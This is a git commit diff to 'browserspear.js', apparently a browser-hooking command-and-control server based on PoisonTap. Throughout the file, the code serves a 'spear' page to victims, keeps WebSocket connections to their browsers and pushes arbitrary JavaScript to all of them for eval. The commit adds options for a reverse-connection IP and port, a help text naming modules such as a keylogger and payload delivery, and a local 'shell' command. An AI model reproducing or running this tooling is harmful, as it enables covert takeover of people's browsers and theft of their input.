615d711a1a53e0540a5731bb903e4ab1b64a4d76
Lars Veelaert <lveelaert@gmail.com>
2018-02-22 23:58:12 +0000

    update

--- browserspear.js
+++ browserspear.js
@@ -1,19 +1,23 @@
-// CREDITS
-// start of project based on PoisonTap by Samy Kamkar
-
-//SERVER
+////COMMAND LINE
 var program = require('commander');
 program.command=null;
 program.commandfile=null;
 program
   .version('0.1.0')
-  .option('-c, --command <type>', 'String of commands to run in the console')
-  .option('-C, --commandfile <type>', 'file with commands to run in the console')
+  //.option('-c, --command <string>', 'String of commands to run in the console')
+  .option('-c, --commandfile <file>', 'file with commands to run in the console')
+  .option('-p, --port <port>', 'Port to listen on')
+  .option('-i, --ip <ip>', 'The ip address to use in the reverse connection')
+  .option('-s, --start', 'Start a listener immediatly')
   .parse(process.argv);
 
+////EXTRAS
+var UglifyJS = require("uglify-js");
+var exec = require('child_process').exec;
+
+////SERVER
 var WebSocketServer = require('websocket').server
 var webSocketsServerPort = 1337
-var UglifyJS = require("uglify-js");
 var fs = require('fs');
 var spearHtml = fs.readFileSync(__dirname + '/spear.html','utf8');
 var http = require('http')
@@ -22,81 +26,22 @@ var gr;
 var module;
 var handlers=[];
 var options;
-//OPTIONS
 options.LHOST = "localhost";
+if (program.ip) {
+	options.LHOST = program.ip;
+}
 options.LPORT = "1337";
+if (program.port) {
+	options.LPORT = program.port;
+}
 options.RHOST = "0.0.0.0";
 options.TARGETS = "all";
 var precursor = ">>>";
 var loaded_module="";
-var server = http.createServer((request, response) => {
 
-  //output((new Date()) + ' HTTP server. URL ' + request.url + ' requested.')
-
-  if (request.url.indexOf('/exec?') === 0)
-  {
-    response.writeHead(404, {'Content-Type': 'text/html'})
-    for (var i in conns)
-      conns[i].sendUTF(JSON.stringify({ request: 'eval', content: request.url.substr(6) }))
-    response.end("sent")
-  }
-  else if (request.url.indexOf('/send?') === 0)
-  {
-    response.writeHead(404, {'Content-Type': 'text/html'})
-    for (var i in conns)
-      conns[i].sendUTF('{"' + decodeURI(request.url.substr(6)).replace(/"/g, '\\"').replace(/&/g, '","').replace(/=/g,'":"') + '"}')
-    var checkgr = () =>
-    {
-      if (gr)
-      {
-        response.end(gr)
-        gr = ""
-      }
-      else
-        setTimeout(checkgr, 500)
-    }
-    checkgr()
-  }
-  else if (request.url === '/status')
-  {
-    response.writeHead(200, {'Content-Type': 'application/json'})
-    var responseObject = {
-      currentClients: 1234,
-      totalHistory: 567
-    }
-    response.end(JSON.stringify(responseObject))
-  }
-  else {
-	response.writeHead(200, {'Content-Type': 'text/html'});
-	response.write('<script type="text/javascript">var host_addr="'+options.LHOST+'";var host_port="'+options.LPORT+'";</script>'+spearHtml);
-	response.end();
-    //response.writeHead(404, {'Content-Tddype': 'text/html'})
-    //response.end('Sorry, unknown url')
-  }
-})
-
-server.listen(options.LPORT, () => {
-
-  console.log((new Date()) + " Server is listening on port " + options.LPORT )
-  if (program.command){
-  	process_command(program.command);
-  } else if (program.commandfile){
-	process_command(fs.readFileSync(__dirname + '/' + program.commandfile,'utf8'));
-  }
-  start_interface();
-})
-
-// create the server
-wsServer = new WebSocketServer({
-  httpServer: server
-})
-function handleresponse(obj, con)
-{
+//RESPONSE HANDLING
+function handleresponse(obj, con) {
 	//HERE WHAT TO DO WITH RESPONSES FROM CLIENTS
-	//if ("fingerprint" in obj) {
-	//	output("fingerprint: "+obj.fingerprint);
-	//	con.fingerprint=obj.fingerprint;
-	//} else if ("data" in obj) {
 	if ("data" in obj) {
 		console.log("");
 		console.log(obj);
@@ -105,82 +50,88 @@ function handleresponse(obj, con)
 	for (i in handlers) {
 		handlers[i].handler(options, con, obj);
 	}
-	// TODO use for merging with connections for info // if ("components" in obj) {
-	//TODO 
-	//have modules be able to handle responses
-	/*
-	###handler all types of files (dataurls)
-	function dataURItoBlob(dataURI) {
-	    // convert base64/URLEncoded data component to raw binary data held in a string
-	    var byteString;
-	    if (dataURI.split(',')[0].indexOf('base64') >= 0)
-		byteString = atob(dataURI.split(',')[1]);
-	    else
-		byteString = unescape(dataURI.split(',')[1]);
-
-	    // separate out the mime component
-	    var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
-
-	    // write the bytes of the string to a typed array
-	    var ia = new Uint8Array(byteString.length);
-	    for (var i = 0; i < byteString.length; i++) {
-		ia[i] = byteString.charCodeAt(i);
-	    }
-
-	    return new Blob([ia], {type:mimeString});
-	}
-
-	var blob = dataURItoBlob(dataURL);
-	var buf = new Buffer(blob); // decode
-	//var buf = new Buffer(req.body.blob, 'base64'); // decode
-	//TODO from mime out of blob.type -> make a detection system for extension of file (image with png, jpeg etc and audio, and video, also html
-	//TODO save with time of receive and fingerprint
-	  fs.writeFile("temp/test.wav", buf, function(err) {
-	    if(err) {
-	      console.log("err", err);
-	    } else {
-	      return res.json({'status': 'success'});
-	    }
-	  }); 
-	  */
 }
-function handleReq(obj, con)
-{
+//REQUEST HANDLING
+function handleReq(obj, con) {
   if (obj.request === 'getresponse')
     gr = obj.html
 }
 
-//REQUESTS
-wsServer.on('request', (request) => {
-  var obj
-  var connection = request.accept(null, request.origin);
-  connection.name = connection.remoteAddress
-  conns.push(connection);
-
-  connection.on('request', (message) => {
-    console.log('request: ' + message)
-  })
-
-  connection.on('message', (message) => {
-    try { obj = JSON.parse(message.utf8Data) } catch(e) {}
-    if (typeof(obj) === 'object') {
-	handleReq(obj, connection);
-	handleresponse(obj,connection); 
-    } else {console.log('message: ' + message.utf8Data); }
-  })
-  // remove connection from our list
-  connection.on('close', connection => {
-    console.log("");
-    console.log('connection closed')
-    for (var i in conns)
-      if (conns[i] == connection)
-        conns.splice(i, 1)
-  })
-
-  //ask_fingerprint_info(connection);
+//HTTP SERVER CONFIG
+var server = http.createServer((request, response) => {
+	if (request.url.indexOf('/exec?') === 0) {
+		response.writeHead(404, {'Content-Type': 'text/html'})
+		for (var i in conns)
+			conns[i].sendUTF(JSON.stringify({ request: 'eval', content: request.url.substr(6) }))
+			response.end("sent")
+	} else if (request.url.indexOf('/send?') === 0) {
+		response.writeHead(404, {'Content-Type': 'text/html'})
+		for (var i in conns)
+		conns[i].sendUTF('{"' + decodeURI(request.url.substr(6)).replace(/"/g, '\\"').replace(/&/g, '","').replace(/=/g,'":"') + '"}')
+		var checkgr = () =>
+		{
+			if (gr) {
+				response.end(gr)
+				gr = ""
+			} else
+				setTimeout(checkgr, 500)
+		}
+		checkgr()
+	} else if (request.url === '/status') {
+		response.writeHead(200, {'Content-Type': 'application/json'})
+		var responseObject = {
+			currentClients: 1234,
+			totalHistory: 567
+		}
+	 	response.end(JSON.stringify(responseObject))
+  	} else {
+		response.writeHead(200, {'Content-Type': 'text/html'});
+		response.write('<script type="text/javascript">var host_addr="'+options.LHOST+'";var host_port="'+options.LPORT+'";</script>'+spearHtml);
+		response.end();
+	}
 })
 
-//INTERFACE
+//HTTP SERVER START
+function start_server() {
+	server.close();
+	server.listen(options.LPORT, () => {
+		console.log((new Date()) + " Server is listening on port " + options.LPORT )
+	})
+}
+if (program.start) {
+	start_server();
+}
+
+//ADD WEBSOCKET SERVER
+wsServer = new WebSocketServer({
+	httpServer: server
+})
+//REQUESTS
+wsServer.on('request', (request) => {
+	var obj;
+	//connection
+	var connection = request.accept(null, request.origin);
+	connection.name = connection.remoteAddress;
+	conns.push(connection);
+	console.log('New connection to client at '+connection.remoteAddress)
+	connection.on('request', (message) => {	console.log('request: ' + message)})
+	connection.on('message', (message) => {
+		try { obj = JSON.parse(message.utf8Data) } catch(e) {}
+			if (typeof(obj) === 'object') {
+				handleReq(obj, connection);
+				handleresponse(obj,connection); 
+			} else {console.log('message: ' + message.utf8Data); }
+	})
+	// remove connection from our list
+	connection.on('close', connection => {
+	console.log('connection closed')
+	for (var i in conns)
+		if (conns[i] == connection)
+			conns.splice(i, 1)
+	})
+})
+
+////INTERFACE
 var prompt = require('prompt');
 var colors = require("colors/safe");
 prompt.message = "";
@@ -199,16 +150,66 @@ function input() {
 		}
 	});
 }
+function banner() {
+}
 function output(text) {
 	console.log("");
 	console.log(text);
 	//console.log("");
 }
 function start_interface() {
-	console.log("Typed javascript-commands will be sent to all connected clients");
+	banner();
+	if (program.command){
+		process_command(program.command);
+	} else if (program.commandfile){
+		process_command(fs.readFileSync(__dirname + '/' + program.commandfile,'utf8'));
+	}
 	input()
 }
-
+//LIST OF SET OPTIONS
+function options() {
+	for (i in options) {
+		console.log(i +'='+options[i]);
+	}
+} 
+//HELP function to be called to have all basic commands listed
+function help(){
+	console.log('Available commands:');
+	console.log("- start | restart");
+	console.log("      Restarts the server that serves the spear and provides the socket to connect to"); 
+	console.log("- set <property> <value>");
+	console.log("      Sets a value used by the server or module. ex. 'set LHOST: mydomain.org'"); 
+	console.log("- options");
+	console.log("      List all the values of the options"); 
+	console.log("- load <module>");
+	console.log("      Loads the functions inside that module. Only one module can be selected at once. ex. 'load keylogger'"); 
+	console.log("- modules <search>");
+	console.log("      Gives a list of all available modules, with an optional searchterm"); 
+	console.log("- exec");
+	console.log("      Executes the 'exec' function of the current selected module. Ex. send a payload"); 
+	console.log("- conns");
+	console.log("      List all connections to the server"); 
+	console.log("- help");
+	console.log("      Print this help"); 
+}
+//ERROR handling for command related stuff
+function command_not_found(command){
+	console.log("'"+command+"' is not a valid command, type 'help' for the full list of commands");
+}
+function modules(searchterm) {
+	if (searchterm) {
+		console.log ("List of modules containing '"+searchterm+ "':");
+	} else {
+		console.log ("List of modules:")
+	}
+	fs.readdirSync(__dirname + '/modules/').forEach(file => {
+		if (!searchterm || file.indexOf(searchterm) !== -1) {
+			if (file.charAt(0) !== '.') {
+		  		console.log('  - '+file);
+			}
+		}
+	})
+}
 //PROCESSING OF COMMANDS
 function process_command(command) {
 	command_lines = command.replace(/(?:\r\n|\r|\n)/g, ';').split(';');
@@ -228,10 +229,11 @@ function process_command(command) {
 		}
 	} else if (first_argument== "set") { 
 		if (command.split(" ").length > 1) {
-			assign=command.split(" ",3);
+			assign=command.split(" ");
 			if (assign.length > 2){
-				options[assign[1].trim()]=assign[2].trim();
-				console.log(assign[1].trim()+" is now set to '"+assign[2].trim()+"'");
+				var value = assign.splice(2).join(" ");
+				options[assign[1].trim()]=value;
+				console.log(assign[1].trim()+" is now set to '"+value+"'");
 
 			} else {
 				console.log("No argument of form <variable>=<value>");
@@ -239,6 +241,10 @@ function process_command(command) {
 		} else {
 			console.log("not enough arguments")
 		}
+	} else if (first_argument== "unset") { 
+		assign=command.split(" ");
+		delete options[assign[1].trim()]
+		console.log(assign[1].trim()+" is now unset");
 	} else if (first_argument== "options") { 
 		if (typeof options === "function") { 
 			options();
@@ -294,9 +300,9 @@ function process_command(command) {
 		if (module.data) {
 		if (typeof module.data.info === "function") { 
 			if (command.split(" ").length > 2) {
-				module.data.info(command.split(" ")[1]);
+				module.data.info(options,command.split(" ")[1]);
 			} else {
-				module.data.info();
+				module.data.info(options);
 			}
 		} else {
 			console.log('No info function present in current module')
@@ -306,49 +312,34 @@ function process_command(command) {
 		}
 	} else if (first_argument== "custom") { 
 		if (options.TARGETS == "all") {
-			inject_string = command.split(" ",2)[1];
+			inject_string = command.split(" ").splice(1).join(" ");
 			console.log("Command sent: "+inject_string);
 			for (var i in conns)
 				conns[i].sendUTF(JSON.stringify({ request: 'eval', content: inject_string }))
 		} else {
 			console.log("targets function TODO");
 		}
+	} else if (first_argument== "shell") { 
+		exec(command.split(" ").splice(1).join(" "), function(err, stdout, stderr) {
+			if (stderr) {
+				console.log(stderr);
+			}
+			if (stdout) {
+				console.log(stdout);
+			}
+		});
+	} else if (first_argument== "restart"|| first_argument == "start") { 
+		//TODO maybe wipe connections and clean
+		start_server();
+
 	} else if (first_argument== "exit") { 
 		process.exit();
+	} else if (first_argument== "help") { 
+		help();
 	} else {
 		command_not_found(command);
 		help();
 	}
 	}
 }
-
-//UNLOAD current module
-function modules(searchterm) {
-	if (searchterm) {
-		console.log ("List of modules containing '"+searchterm+ "':");
-	} else {
-		console.log ("List of modules:")
-	}
-	fs.readdirSync(__dirname + '/modules/').forEach(file => {
-		if (!searchterm || file.indexOf(searchterm) !== -1) {
-			if (file.charAt(0) !== '.') {
-		  		console.log('  - '+file);
-			}
-		}
-	})
-}
-//LIST OF SET OPTIONS
-function options() {
-	for (i in options) {
-		console.log(i +'='+options[i]);
-	}
-} 
-//HELP function to be called to have all basic commands listed
-function help(){
-	console.log("HELP");
-}
-//ERROR handling for command related stuff
-function command_not_found(command){
-	console.log("'"+command+"' is not a valid command, type 'help' for the full list of commands");
-}
-
+start_interface();
